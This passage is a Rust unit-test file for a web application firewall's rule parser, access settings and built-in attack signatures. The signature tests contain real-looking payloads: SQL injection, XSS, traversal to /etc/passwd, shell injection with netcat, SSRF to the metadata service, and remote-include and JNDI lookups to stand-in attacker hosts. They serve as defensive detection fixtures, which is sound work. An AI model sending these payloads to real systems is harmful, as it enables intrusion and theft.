//! Unit tests for the rule parser, the access and rule settings, the built-in
//! signatures, normalization and matching.

use std::net::{IpAddr, Ipv4Addr};

use http::{HeaderMap, HeaderName, HeaderValue, Method};
use proptest::prelude::*;
use rstest::rstest;

use super::matching::{form_value, header_value};
use super::*;
use crate::config::Config;
use crate::error::ConfigError;
use crate::prefilter::{self, Screening};
use crate::rules::matching::MAX_REGEX_BYTES;

/// A configuration with `top` at the top level and `site_lines` inside `example.com`.
fn config(top: &str, site_lines: &str) -> Result<Config, ConfigError> {
    let text = format!(
        "listen 127.0.0.1:8080;\n{top}\n\
         decision {{\n    backend http;\n    url http://stub-decider:9000/decide;\n}}\n\
         default_status 421;\n\
         site example.com {{\n    upstream http://upstream:80;\n{site_lines}}}\n"
    );
    Config::parse_str(&text, "test.conf")
}

fn message(result: Result<Config, ConfigError>) -> String {
    match result {
        Ok(_) => String::new(),
        Err(error) => error.to_string(),
    }
}

/// Parses a rule written at the top level, with a description and an action added when `extra` leaves them out.
fn parse_top_rule(body: &str) -> Result<ParsedRule, ConfigError> {
    let text = format!("rule test-rule {{\n{body}\n}}\n");
    let directives = conf::parse_source(&text, "test.conf")?;
    let directive = directives.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no directive".to_owned(),
    })?;
    parse_rule(directive, Scope::Top)
}

fn ids(rules: &[Arc<Rule>]) -> Vec<String> {
    rules.iter().map(|rule| rule.id.to_string()).collect()
}

// Parser and validation.

#[rstest]
#[case::missing_description("action block;\npath /x;", "needs a \"description\"")]
#[case::missing_action("description \"d\";\npath /x;", "needs an \"action\"")]
#[case::no_condition("description \"d\";\naction block;", "needs at least one condition")]
#[case::unknown_action(
    "description \"d\";\naction allow;\npath /x;",
    "must be \"block\" or \"skip\""
)]
#[case::empty_description("description \" \";\naction block;\npath /x;", "must not be empty")]
#[case::duplicate_description(
    "description \"a\";\ndescription \"b\";\naction block;\npath /x;",
    "duplicate directive \"description\""
)]
#[case::unknown_directive(
    "description \"d\";\naction block;\nfoo bar;",
    "unknown directive \"foo\" in rule"
)]
#[case::path_without_slash("description \"d\";\naction block;\npath x;", "must start with \"/\"")]
#[case::path_bad_modifier("description \"d\";\naction block;\npath ~~ /x;", "modifier must be")]
#[case::path_exact_without_slash(
    "description \"d\";\naction block;\npath = x;",
    "must start with \"/\""
)]
#[case::path_too_many_arguments("description \"d\";\naction block;\npath a b c;", "takes a value")]
#[case::duplicate_path(
    "description \"d\";\naction block;\npath /a;\npath /b;",
    "duplicate directive \"path\""
)]
#[case::query_without_operator(
    "description \"d\";\naction block;\nquery x;",
    "takes an operator and a regex"
)]
#[case::query_with_bad_operator(
    "description \"d\";\naction block;\nquery = \"x\";",
    "takes ~ or ~*"
)]
#[case::bad_regex("description \"d\";\naction block;\nquery ~ \"(\";", "invalid regex")]
#[case::regex_too_large_for_the_limit(
    "description \"d\";\naction block;\nany ~ \"(a{1000}){1000}\";",
    "invalid regex"
)]
#[case::bad_header_name(
    "description \"d\";\naction block;\nheader \"bad name\" ~ \"x\";",
    "not a header name"
)]
#[case::header_missing_regex(
    "description \"d\";\naction block;\nheader user-agent ~*;",
    "takes a name, an operator and a regex"
)]
#[case::empty_method(
    "description \"d\";\naction block;\nmethod \"\";",
    "not a valid method"
)]
#[case::method_needs_an_argument(
    "description \"d\";\naction block;\nmethod;",
    "needs at least one method"
)]
#[case::bad_client(
    "description \"d\";\naction block;\nclient 10.0.0.300;",
    "not an address or network"
)]
#[case::client_needs_an_argument(
    "description \"d\";\naction block;\nclient;",
    "needs at least one address"
)]
#[case::site_with_no_host(
    "description \"d\";\naction block;\npath /x;\nsite;",
    "site\" needs at least one host name"
)]
fn invalid_rule_directives_are_rejected_with_their_line(
    #[case] body: &str,
    #[case] expected: &str,
) {
    let error = parse_top_rule(body)
        .err()
        .map(|e| e.to_string())
        .unwrap_or_default();
    assert!(error.starts_with("test.conf:"), "{error}");
    assert!(error.contains(expected), "{error}");
}

#[test]
fn a_valid_rule_collects_every_directive() -> Result<(), ConfigError> {
    let parsed = parse_top_rule(
        "description \"all\";\naction skip;\nsite example.com;\nmethod GET POST;\n\
         path ^~ /api;\nclient 192.0.2.0/24 198.51.100.1;\nquery ~* \"a\";\n\
         header user-agent ~ \"b\";\nbody ~ \"c\";\nany ~* \"d\";",
    )?;
    assert_eq!(&*parsed.rule.id, "test-rule");
    assert_eq!(parsed.rule.action, RuleAction::Skip);
    assert_eq!(parsed.rule.description, "all");
    assert_eq!(parsed.sites, Some(vec!["example.com".to_owned()]));
    assert_eq!(parsed.rule.methods, Some(vec![Method::GET, Method::POST]));
    assert_eq!(parsed.rule.path, Some(PathMatch::Prefix("/api".to_owned())));
    assert_eq!(parsed.rule.clients.as_ref().map(Vec::len), Some(2));
    assert_eq!(parsed.rule.query.len(), 1);
    assert_eq!(parsed.rule.headers.len(), 1);
    assert_eq!(parsed.rule.body.len(), 1);
    assert_eq!(parsed.rule.any.len(), 1);
    Ok(())
}

#[rstest]
#[case::prefix("/a", PathMatch::Prefix("/a".to_owned()))]
#[case::exact("= /a", PathMatch::Exact("/a".to_owned()))]
#[case::caret_prefix("^~ /a", PathMatch::Prefix("/a".to_owned()))]
fn path_modifiers_map_to_their_match(
    #[case] args: &str,
    #[case] expected: PathMatch,
) -> Result<(), ConfigError> {
    let parsed = parse_top_rule(&format!("description \"d\";\naction block;\npath {args};"))?;
    assert_eq!(parsed.rule.path, Some(expected));
    Ok(())
}

#[test]
fn a_site_directive_is_only_valid_in_a_top_level_rule() {
    let config_result = config(
        "",
        "rule inner {\n    description \"d\";\n    action block;\n    site example.com;\n    path /x;\n}\n",
    );
    let text = message(config_result);
    assert!(
        text.contains("\"site\" is only valid in a top-level rule"),
        "{text}"
    );
}

#[test]
fn a_top_level_rule_can_name_a_site_that_exists() -> Result<(), ConfigError> {
    let cfg = config(
        "rule scoped {\n    description \"d\";\n    action block;\n    site example.com;\n    path /x;\n}\n",
        "",
    )?;
    let site = cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })?;
    assert!(ids(&site.rules.block).contains(&"scoped".to_owned()));
    Ok(())
}

#[test]
fn a_top_level_rule_that_names_no_site_is_rejected() {
    let text = message(config(
        "rule scoped {\n    description \"d\";\n    action block;\n    site other.example;\n    path /x;\n}\n",
        "",
    ));
    assert!(
        text.contains("rule names no configured site: other.example"),
        "{text}"
    );
}

#[test]
fn rule_ids_must_be_unique_across_files_and_say_where_the_first_one_is() -> Result<(), ConfigError>
{
    let dir = std::env::temp_dir().join(format!("vh-rules-dup-{}", std::process::id()));
    std::fs::create_dir_all(&dir).map_err(|source| ConfigError::Read {
        path: dir.clone(),
        source,
    })?;
    let first = dir.join("first.conf");
    let second = dir.join("second.conf");
    let main = dir.join("main.conf");
    let rule = "rule same {\n    description \"d\";\n    action block;\n    path /x;\n}\n";
    std::fs::write(&first, rule).map_err(|source| ConfigError::Read {
        path: first.clone(),
        source,
    })?;
    std::fs::write(&second, format!("\n{rule}")).map_err(|source| ConfigError::Read {
        path: second.clone(),
        source,
    })?;
    std::fs::write(
        &main,
        "listen 127.0.0.1:8080;\ninclude first.conf;\ninclude second.conf;\n\
         decision {\n    backend http;\n    url http://stub-decider:9000/decide;\n}\n\
         site example.com {\n    upstream http://upstream:80;\n}\n",
    )
    .map_err(|source| ConfigError::Read {
        path: main.clone(),
        source,
    })?;
    let text = match Config::load(&main) {
        Ok(_) => String::new(),
        Err(error) => error.to_string(),
    };
    let _ = std::fs::remove_dir_all(&dir);
    assert!(
        text.contains("second.conf:2: rule id \"same\" is already defined at"),
        "{text}"
    );
    assert!(text.contains("first.conf:1"), "{text}");
    Ok(())
}

#[test]
fn a_rule_id_in_a_site_block_clashes_with_a_top_level_one() {
    let text = message(config(
        "rule dup {\n    description \"d\";\n    action block;\n    path /x;\n}\n",
        "rule dup {\n    description \"d\";\n    action block;\n    path /y;\n}\n",
    ));
    assert!(
        text.contains("rule id \"dup\" is already defined at test.conf:"),
        "{text}"
    );
}

#[rstest]
#[case::reserved_prefix("vh-custom")]
#[case::reserved_prefix_short("vh-x")]
fn the_vh_prefix_is_reserved_for_built_in_rules(#[case] id: &str) {
    let text = message(config(
        &format!("rule {id} {{\n    description \"d\";\n    action block;\n    path /x;\n}}\n"),
        "",
    ));
    assert!(text.contains("reserved for built-in rules"), "{text}");
}

#[rstest]
#[case::space("\"a b\"")]
#[case::too_long(&format!("\"{}\"", "a".repeat(65)))]
#[case::slash("a/b")]
fn rule_ids_are_limited_in_form(#[case] id: &str) {
    let text = message(config(
        &format!("rule {id} {{\n    description \"d\";\n    action block;\n    path /x;\n}}\n"),
        "",
    ));
    assert!(text.contains("must be 1 to 64 letters, digits"), "{text}");
}

#[test]
fn an_oversized_regex_is_a_configuration_error() {
    let body = format!(
        "description \"d\";\naction block;\nquery ~ \"{}\";",
        "a".repeat(MAX_REGEX_BYTES + 1)
    );
    let text = parse_top_rule(&body)
        .err()
        .map(|e| e.to_string())
        .unwrap_or_default();
    assert!(text.starts_with("test.conf:"), "{text}");
    assert!(text.contains("regex is longer than 512 bytes"), "{text}");
}

#[test]
fn a_rule_needs_a_block_and_one_id() {
    let no_block = message(config("rule nob;\n", ""));
    assert!(no_block.contains("needs a block"), "{no_block}");
    let two_ids = message(config("rule a b {\n}\n", ""));
    assert!(two_ids.contains("exactly one id"), "{two_ids}");
}

/// A top-level rule with a unique id and path, numbered by `index`.
fn numbered_rule(index: usize) -> String {
    format!(
        "rule r{index} {{\n    description \"d\";\n    action block;\n    path /x{index};\n}}\n"
    )
}

#[test]
fn the_rule_count_is_capped_and_built_in_rules_count_too() {
    let mut top = String::new();
    for index in 0..MAX_RULES {
        top.push_str(&numbered_rule(index));
    }
    let builtin_count = builtin_rules().map_or(0, <[Arc<Rule>]>::len);
    let allowed = MAX_RULES.saturating_sub(builtin_count);
    let text = message(config(&top, ""));
    assert!(text.contains("too many rules: at most 1000"), "{text}");
    let mut fits = String::new();
    for index in 0..allowed {
        fits.push_str(&numbered_rule(index));
    }
    assert!(config(&fits, "").is_ok());
}

#[test]
fn disable_rule_must_name_a_built_in_rule() {
    let text = message(config("disable_rule vh-nope-001;", ""));
    assert!(
        text.contains("names no built-in rule: vh-nope-001"),
        "{text}"
    );
    assert!(config("disable_rule vh-sqli-001 vh-xss-002;", "").is_ok());
}

#[test]
fn builtin_rules_on_and_off_are_read_and_checked() {
    assert!(message(config("builtin_rules maybe;", "")).contains("must be \"on\" or \"off\""));
    assert!(
        message(config("builtin_rules off;\nbuiltin_rules on;", ""))
            .contains("duplicate directive")
    );
}

#[test]
fn a_site_can_turn_built_in_rules_off_and_disable_one_of_them() -> Result<(), ConfigError> {
    let cfg = config("", "builtin_rules off;\n")?;
    let site = cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })?;
    assert_eq!(site.rules.block.len(), 0);
    let cfg = config("disable_rule vh-sqli-001;", "")?;
    let site = cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })?;
    assert!(!ids(&site.rules.block).contains(&"vh-sqli-001".to_owned()));
    assert!(ids(&site.rules.block).contains(&"vh-xss-002".to_owned()));
    Ok(())
}

#[test]
fn a_site_on_overrides_a_top_level_off() -> Result<(), ConfigError> {
    let cfg = config("builtin_rules off;", "builtin_rules on;\n")?;
    let site = cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })?;
    assert_ne!(site.rules.block.len(), 0);
    Ok(())
}

#[test]
fn block_rules_come_built_in_first_then_top_level_then_site() -> Result<(), ConfigError> {
    let cfg = config(
        "rule top-block {\n    description \"d\";\n    action block;\n    path /t;\n}\n",
        "rule site-block {\n    description \"d\";\n    action block;\n    path /s;\n}\n\
         rule site-skip {\n    description \"d\";\n    action skip;\n    path /s;\n}\n",
    )?;
    let site = cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })?;
    let block = ids(&site.rules.block);
    let top = block.iter().position(|id| id == "top-block");
    let own = block.iter().position(|id| id == "site-block");
    let first_user = block.iter().position(|id| !id.starts_with("vh-"));
    assert_eq!(first_user, top);
    assert!(top < own);
    assert_eq!(ids(&site.rules.skip), ["site-skip"]);
    Ok(())
}

// Access lists and rule inheritance in the configuration.

fn first_site(cfg: &Config) -> Result<&crate::config::SiteConfig, ConfigError> {
    cfg.sites.first().ok_or_else(|| ConfigError::Invalid {
        file: "test.conf".to_owned(),
        line: 1,
        message: "no site".to_owned(),
    })
}

#[test]
fn a_site_access_list_replaces_the_top_level_one() -> Result<(), ConfigError> {
    let cfg = config("deny all;", "allow 192.0.2.0/24;\n")?;
    assert_eq!(cfg.access.len(), 1);
    assert_eq!(first_site(&cfg)?.access.len(), 1);
    assert!(
        first_site(&cfg)?
            .access
            .first()
            .is_some_and(|entry| entry.allow)
    );
    Ok(())
}

#[test]
fn a_site_without_an_access_list_inherits_the_top_level_one() -> Result<(), ConfigError> {
    let cfg = config("allow 10.0.0.0/8;\ndeny all;", "")?;
    assert_eq!(first_site(&cfg)?.access, cfg.access);
    assert_eq!(cfg.access.len(), 2);
    Ok(())
}

#[test]
fn access_lines_must_name_an_address_network_or_all() {
    let text = message(config("allow 300.1.1.1;", ""));
    assert!(
        text.contains("must be an address, a network or all"),
        "{text}"
    );
}

// Built-in signatures: one positive and one negative example each.

/// Runs the built-in rules over one request and returns the id of the first rule that matches.
fn builtin_hit(
    method: &str,
    path: &str,
    query: Option<&str>,
    headers: &[(&str, &str)],
    body: &[u8],
) -> Option<String> {
    let method = Method::from_bytes(method.as_bytes()).unwrap_or(Method::GET);
    let mut map = HeaderMap::new();
    for (name, value) in headers {
        if let (Ok(name), Ok(value)) = (
            HeaderName::from_bytes(name.as_bytes()),
            HeaderValue::from_bytes(value.as_bytes()),
        ) {
            map.append(name, value);
        }
    }
    let client = IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1));
    let input = RuleInput::new(&method, path, query, &map, body, client);
    let rules = builtin_rules().unwrap_or(&[]);
    matching::first_match(rules, &input).map(|rule| rule.id.to_string())
}

/// One request that must trigger `id`, and one ordinary request that must not.
struct Example {
    id: &'static str,
    method: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    headers: &'static [(&'static str, &'static str)],
    body: &'static [u8],
    negative: (&'static str, Option<&'static str>, &'static [u8]),
}

const UA: &[(&str, &str)] = &[("user-agent", "Mozilla/5.0 (Macintosh)")];

const EXAMPLES: &[Example] = &[
    Example {
        id: "vh-sqli-001",
        method: "GET",
        path: "/item",
        query: Some("id=1%20UNION%20SELECT%20username"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("q=european+selection"), b""),
    },
    Example {
        id: "vh-sqli-002",
        method: "GET",
        path: "/item",
        query: Some("id=' or 1=1--"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("name=O'Brien"), b""),
    },
    Example {
        id: "vh-sqli-003",
        method: "GET",
        path: "/item",
        query: Some("x=%27;drop%20table%20users"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("note=done;drop-off"), b""),
    },
    Example {
        id: "vh-sqli-004",
        method: "GET",
        path: "/item",
        query: Some("id=1' and sleep(5)--"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("msg=please sleep(well)"), b""),
    },
    Example {
        id: "vh-xss-001",
        method: "GET",
        path: "/search",
        query: Some("q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        headers: UA,
        body: b"",
        negative: ("/search", Some("q=%3Cb%3Ebold%3C%2Fb%3E"), b""),
    },
    Example {
        id: "vh-xss-002",
        method: "GET",
        path: "/go",
        query: Some("next=javascript:alert(1)"),
        headers: UA,
        body: b"",
        negative: ("/go", Some("next=/home"), b""),
    },
    Example {
        id: "vh-xss-003",
        method: "GET",
        path: "/search",
        query: Some("q=<img src=x onerror=alert(1)>"),
        headers: UA,
        body: b"",
        negative: ("/search", Some("q=<img src=logo.png>"), b""),
    },
    Example {
        id: "vh-traversal-001",
        method: "GET",
        path: "/files",
        query: Some("file=..%252F..%252Fetc"),
        headers: UA,
        body: b"",
        negative: ("/files", Some("page=2&sort=asc"), b""),
    },
    Example {
        id: "vh-traversal-002",
        method: "GET",
        path: "/download",
        query: Some("file=etc/passwd"),
        headers: UA,
        body: b"",
        negative: ("/etc-guide/passwordless", None, b""),
    },
    Example {
        id: "vh-traversal-003",
        method: "GET",
        path: "/static/..;/etc/passwd",
        query: None,
        headers: UA,
        body: b"",
        negative: ("/static/etc-guide/passwordless", None, b""),
    },
    Example {
        id: "vh-cmdi-001",
        method: "GET",
        path: "/run",
        query: Some("cmd=a;cat /etc/hosts"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("q=cat;dog"), b""),
    },
    Example {
        id: "vh-cmdi-002",
        method: "GET",
        path: "/run",
        query: Some("x=$(id)"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("price=$5 (approx)"), b""),
    },
    Example {
        id: "vh-cmdi-003",
        method: "GET",
        path: "/run",
        query: Some("x=`id`"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("x=`code` sample"), b""),
    },
    Example {
        id: "vh-lfi-001",
        method: "POST",
        path: "/upload",
        query: None,
        headers: UA,
        body: b"url=php://filter/convert.base64-encode/resource=index",
        negative: ("/upload", None, b"see the php docs"),
    },
    Example {
        id: "vh-lfi-002",
        method: "GET",
        path: "/img",
        query: Some("src=data:text/html;base64,PHNjcmlwdD4="),
        headers: UA,
        body: b"",
        negative: ("/img", Some("src=data-driven"), b""),
    },
    Example {
        id: "vh-lfi-003",
        method: "GET",
        path: "/run",
        query: Some("x=expect://id"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("x=expectation"), b""),
    },
    Example {
        id: "vh-lfi-004",
        method: "GET",
        path: "/view",
        query: Some("page=https://evil.example/shell.txt"),
        headers: UA,
        body: b"",
        negative: ("/view", Some("page=2"), b""),
    },
    Example {
        id: "vh-ssrf-001",
        method: "GET",
        path: "/fetch",
        query: Some("url=http://169.254.169.254/latest/meta-data/"),
        headers: UA,
        body: b"",
        negative: ("/fetch", Some("url=http://169.254.1.1/"), b""),
    },
    Example {
        id: "vh-ssrf-002",
        method: "GET",
        path: "/fetch",
        query: Some("u=gopher://127.0.0.1:6379/_"),
        headers: UA,
        body: b"",
        negative: ("/fetch", Some("u=https://example.com/"), b""),
    },
    Example {
        id: "vh-expr-001",
        method: "GET",
        path: "/",
        query: None,
        headers: &[("user-agent", "${jndi:ldap://attacker.example/a}")],
        body: b"",
        negative: ("/", None, b""),
    },
    Example {
        id: "vh-expr-002",
        method: "GET",
        path: "/",
        query: Some("t={{7*7}}"),
        headers: UA,
        body: b"",
        negative: ("/", Some("t={{name}}"), b""),
    },
    Example {
        id: "vh-expr-003",
        method: "GET",
        path: "/",
        query: Some("class.module.classLoader.resources=1"),
        headers: UA,
        body: b"",
        negative: ("/", Some("class=module"), b""),
    },
    Example {
        id: "vh-xxe-001",
        method: "POST",
        path: "/xml",
        query: None,
        headers: UA,
        body: b"<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        negative: ("/xml", None, b"<!DOCTYPE html><html></html>"),
    },
    Example {
        id: "vh-scanner-001",
        method: "GET",
        path: "/",
        query: None,
        headers: &[("user-agent", "sqlmap/1.7.2#stable")],
        body: b"",
        negative: ("/", None, b""),
    },
    Example {
        id: "vh-cve-2026-9103",
        method: "GET",
        path: "/api/v1/login/auto_login",
        query: None,
        headers: UA,
        body: b"",
        negative: ("/api/v1/login", None, b""),
    },
    Example {
        id: "vh-cve-2026-8481",
        method: "POST",
        path: "/api/v1/validate/code",
        query: None,
        headers: UA,
        body: b"{\"code\": \"import os\"}",
        negative: ("/api/v1/validate/prompt", None, b""),
    },
];

#[test]
fn every_built_in_rule_has_a_positive_and_a_negative_example() -> Result<(), ConfigError> {
    let shipped: Vec<String> = builtin_rules()?
        .iter()
        .map(|rule| rule.id.to_string())
        .collect();
    let covered: Vec<String> = EXAMPLES
        .iter()
        .map(|example| example.id.to_owned())
        .collect();
    assert_eq!(
        shipped, covered,
        "every built-in rule needs an example, in order"
    );
    Ok(())
}

#[test]
fn built_in_rules_match_their_positive_examples() {
    for example in EXAMPLES {
        let hit = builtin_hit(
            example.method,
            example.path,
            example.query,
            example.headers,
            example.body,
        );
        assert_eq!(
            hit.as_deref(),
            Some(example.id),
            "positive example of {}",
            example.id
        );
    }
}

#[test]
fn built_in_rules_leave_their_negative_examples_alone() {
    for example in EXAMPLES {
        let (path, query, body) = example.negative;
        let hit = builtin_hit(example.method, path, query, UA, body);
        assert_eq!(hit, None, "negative example of {}", example.id);
    }
}

/// A parameter whose name starts with a command name is not a command: the command
/// must be followed by whitespace, the end of the value, or a shell separator.
#[rstest]
#[case::id_parameter_with_dash("x=1&id-from=3")]
#[case::cat_parameter_with_dash("x=1&cat-name=x")]
#[case::nc_parameter_with_dash("x=1&nc-mode=1")]
#[case::command_name_inside_a_longer_word("x=1&identity=2")]
fn a_parameter_named_after_a_command_is_not_a_command_injection(#[case] query: &str) {
    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
    assert_ne!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
}

/// The command is still caught when it ends the value, or is followed by a space or a separator.
#[rstest]
#[case::at_the_end_of_the_value("x=1&id")]
#[case::followed_by_a_space("x=1;cat -n /etc/hosts")]
#[case::after_a_pipe_followed_by_a_host("x=1|nc 10.0.0.1 4444")]
#[case::followed_by_a_semicolon("x=1&sh;ls")]
fn a_shell_command_is_still_caught(#[case] query: &str) {
    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
    assert_eq!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
}

/// Ordinary text that a fixed-width signature must not match: SQL and HTML discussed in prose,
/// a code paste, a base64 blob, Japanese text and a relative link.
#[rstest]
#[case::sql_in_a_forum_post(
    "POST",
    "/forum/post",
    None,
    b"body=To+get+rows+use+SELECT+*+FROM+users+WHERE+id+%3D+1%3B+-- done".as_slice()
)]
#[case::union_in_prose("POST", "/blog", None, b"comment=UNION+SELECT+is+a+SQL+keyword".as_slice())]
#[case::html_in_a_post("POST", "/comment", None, b"comment=%3Cb%3Ehi%3C%2Fb%3E+%3Cscript%3E+is+a+tag".as_slice())]
#[case::code_paste_with_sleep("POST", "/code", None, b"code=setTimeout(() => sleep(1000), 0);".as_slice())]
#[case::base64_blob("POST", "/upload", None, b"data=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==".as_slice())]
#[case::japanese_text("POST", "/contact", None, "message=こんにちは、ユニオンの選択について質問です。".as_bytes())]
#[case::relative_link("POST", "/post", None, b"text=see+../images/logo.png+for+details".as_slice())]
#[case::etc_in_prose("GET", "/docs", Some("q=where+is+etc+passwd+stored"), b"".as_slice())]
fn ordinary_text_matches_no_built_in_rule(
    #[case] method: &str,
    #[case] path: &str,
    #[case] query: Option<&str>,
    #[case] body: &[u8],
) {
    assert_eq!(builtin_hit(method, path, query, UA, body), None);
}

// Matching of user rules and the screening order.

fn site_with(rules: &str, site_lines: &str) -> Result<crate::config::SiteConfig, ConfigError> {
    let cfg = config(rules, site_lines)?;
    cfg.sites
        .into_iter()
        .next()
        .ok_or_else(|| ConfigError::Invalid {
            file: "test.conf".to_owned(),
            line: 1,
            message: "no site".to_owned(),
        })
}

fn screen_request(
    site: &crate::config::SiteConfig,
    method: &str,
    path: &str,
    query: Option<&str>,
    headers: &[(&str, &str)],
    body: &[u8],
) -> Screening {
    let method = Method::from_bytes(method.as_bytes()).unwrap_or(Method::GET);
    let mut map = HeaderMap::new();
    for (name, value) in headers {
        if let (Ok(name), Ok(value)) = (
            HeaderName::from_bytes(name.as_bytes()),
            HeaderValue::from_bytes(value.as_bytes()),
        ) {
            map.append(name, value);
        }
    }
    let client = IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1));
    let input = RuleInput::new(&method, path, query, &map, body, client);
    prefilter::screen(site, &input, body.is_empty())
}

const USER_RULES: &str = "\
rule block-admin {\n    description \"admin probe\";\n    action block;\n    path ^~ /admin;\n    method POST;\n}\n\
rule skip-health {\n    description \"health checks\";\n    action skip;\n    path = /health;\n}\n\
rule skip-any {\n    description \"skip everything named skip\";\n    action skip;\n    any ~* \"attack\";\n}\n";

#[test]
fn a_user_block_rule_matches_on_its_conditions_only() -> Result<(), ConfigError> {
    let site = site_with(USER_RULES, "")?;
    assert_eq!(
        screen_request(&site, "POST", "/admin/login", None, &[], b"x"),
        Screening::Rule(Some(Arc::from("block-admin")))
    );
    assert_ne!(
        screen_request(&site, "GET", "/admin/login", None, &[], b""),
        Screening::Rule(Some(Arc::from("block-admin")))
    );
    Ok(())
}

#[test]
fn a_skip_rule_skips_the_backend_and_a_block_rule_wins_over_it() -> Result<(), ConfigError> {
    let site = site_with(USER_RULES, "")?;
    assert_eq!(
        screen_request(&site, "GET", "/health", None, &[], b""),
        Screening::SkipRule(Arc::from("skip-health"))
    );
    // The request matches a skip rule and a block rule: it is blocked.
    assert_eq!(
        screen_request(&site, "POST", "/admin/health", None, &[], b""),
        Screening::Rule(Some(Arc::from("block-admin")))
    );
    Ok(())
}

#[test]
fn a_skip_rule_cannot_let_through_a_request_a_block_rule_matches() -> Result<(), ConfigError> {
    let site = site_with(
        "rule block-q {\n    description \"blocked\";\n    action block;\n    query ~ \"evil\";\n}\n\
         rule skip-all {\n    description \"skips\";\n    action skip;\n    method GET;\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(&site, "GET", "/x", Some("evil=1"), &[], b""),
        Screening::Rule(Some(Arc::from("block-q")))
    );
    assert_eq!(
        screen_request(&site, "GET", "/x", Some("fine=1"), &[], b""),
        Screening::SkipRule(Arc::from("skip-all"))
    );
    Ok(())
}

#[test]
fn deny_path_is_checked_before_any_rule() -> Result<(), ConfigError> {
    let site = site_with(
        "rule block-all {\n    description \"d\";\n    action block;\n    method GET;\n}\n",
        "deny_path /xmlrpc.php;\n",
    )?;
    assert_eq!(
        screen_request(&site, "GET", "/xmlrpc.php", None, &[], b""),
        Screening::Rule(None)
    );
    Ok(())
}

#[test]
fn static_skip_comes_after_block_rules() -> Result<(), ConfigError> {
    let site = site_with(
        "rule block-css {\n    description \"d\";\n    action block;\n    path /style.css;\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(&site, "GET", "/style.css", None, &[], b""),
        Screening::Rule(Some(Arc::from("block-css")))
    );
    assert_eq!(
        screen_request(&site, "GET", "/app.css", None, &[], b""),
        Screening::Skip
    );
    Ok(())
}

#[test]
fn client_conditions_match_the_realip_address() -> Result<(), ConfigError> {
    let site = site_with(
        "rule from-lan {\n    description \"d\";\n    action block;\n    client 192.0.2.0/24;\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(&site, "GET", "/", None, &[], b""),
        Screening::Rule(Some(Arc::from("from-lan")))
    );
    Ok(())
}

#[test]
fn header_conditions_must_all_match_and_an_absent_header_does_not_match() -> Result<(), ConfigError>
{
    let site = site_with(
        "rule two-headers {\n    description \"d\";\n    action block;\n    header x-a ~ \"one\";\n    header x-b ~ \"two\";\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(
            &site,
            "GET",
            "/",
            None,
            &[("x-a", "one"), ("x-b", "two")],
            b""
        ),
        Screening::Rule(Some(Arc::from("two-headers")))
    );
    assert_eq!(
        screen_request(&site, "GET", "/", None, &[("x-a", "one")], b""),
        Screening::Inspect
    );
    Ok(())
}

#[test]
fn a_case_sensitive_path_regex_does_not_match_another_case() -> Result<(), ConfigError> {
    let site = site_with(
        "rule cs {\n    description \"d\";\n    action block;\n    path ~ \"^/Admin\";\n}\n\
         rule ci {\n    description \"d\";\n    action block;\n    path ~* \"^/Other\";\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(&site, "GET", "/admin", None, &[], b""),
        Screening::Inspect
    );
    assert_eq!(
        screen_request(&site, "GET", "/Admin", None, &[], b""),
        Screening::Rule(Some(Arc::from("cs")))
    );
    assert_eq!(
        screen_request(&site, "GET", "/other", None, &[], b""),
        Screening::Rule(Some(Arc::from("ci")))
    );
    Ok(())
}

#[test]
fn a_body_condition_sees_only_the_inspected_prefix() -> Result<(), ConfigError> {
    let site = site_with(
        "rule body-x {\n    description \"d\";\n    action block;\n    body ~ \"evil\";\n}\n",
        "",
    )?;
    assert_eq!(
        screen_request(&site, "POST", "/", None, &[], b"evil"),
        Screening::Rule(Some(Arc::from("body-x")))
    );
    assert_eq!(
        screen_request(&site, "POST", "/", None, &[], b"fine"),
        Screening::Inspect
    );
    Ok(())
}

// Normalization of the inputs.

#[test]
fn a_plus_in_the_query_matches_a_space_and_a_double_encoded_quote_matches_a_quote() {
    assert!(builtin_hit("GET", "/", Some("q=union+select"), UA, b"").is_some());
    assert!(builtin_hit("GET", "/", Some("q=%2527+or+1%3D1--"), UA, b"").is_some());
}

#[test]
fn a_nul_byte_inside_a_keyword_is_removed_before_matching() {
    // NUL is dropped after decoding, so "un%00ion" reads as "union".
    assert_eq!(
        builtin_hit("GET", "/", Some("q=un%00ion%20select"), UA, b""),
        Some("vh-sqli-001".to_owned())
    );
    assert_eq!(
        builtin_hit("GET", "/", Some("q=uni%00on+select"), UA, b""),
        Some("vh-sqli-001".to_owned())
    );
    assert_eq!(
        builtin_hit("GET", "/", Some("q=union%00+select"), UA, b""),
